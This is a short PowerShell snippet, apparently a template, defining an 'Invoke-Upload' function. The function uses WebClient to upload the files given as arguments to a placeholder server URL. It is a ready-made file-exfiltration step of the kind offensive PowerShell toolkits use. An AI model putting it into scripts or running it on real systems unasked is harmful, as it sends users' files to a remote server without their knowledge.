function Invoke-Upload {
    $wc = New-Object System.Net.WebClient; $resp = $wc.UploadFile('{{http_server_url}}', $args)
}
